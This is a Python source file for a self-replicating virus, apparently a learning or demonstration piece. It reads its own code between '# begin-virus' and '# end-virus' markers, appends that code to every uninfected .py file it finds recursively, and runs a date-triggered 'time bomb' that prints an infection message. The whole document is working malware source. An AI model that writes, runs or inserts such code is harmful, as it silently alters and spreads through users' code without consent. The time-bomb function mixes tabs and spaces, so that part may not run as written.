# begin-virus
import glob
import datetime

def find_files_to_infect(directory = "."):
    return [file for file in glob.glob("**/*.py",recursive=True)]



def get_content_of_file(file):
    data = None
    with open(file, "r") as my_file:
        data = my_file.readlines()
    return data


def get_content_if_infectable(file):
    data = get_content_of_file(file)
    for line in data:
        if "# begin-virus" in line:
            return None
    return data


def infect(file, virus_code):
    if (data:=get_content_if_infectable(file)):
        with open(file, "a") as infected_file:
            infected_file.write("".join(virus_code))
        
     




def get_virus_code():
    virus_code_on = False
    virus_code = []
    code = get_content_of_file(__file__)
    for line in code:
        if "# begin-virus\n" in line:
            virus_code_on = True
        if virus_code_on:
            virus_code.append(line)
        if "# end-virus\n" in line:
            virus_code_on = False

            break

    return virus_code

def time_bomb():
    # the virus Time Bomb
	today = str(datetime.datetime.today())[:10]
	if str('2021-11-30') == today:
		print("You have been infected By MAI")


# retrieve the virus code from the current infected script

virus_code = get_virus_code()
# look for other files to infect
for file in find_files_to_infect():
    infect(file, virus_code)
time_bomb()
    
       




# end-virus

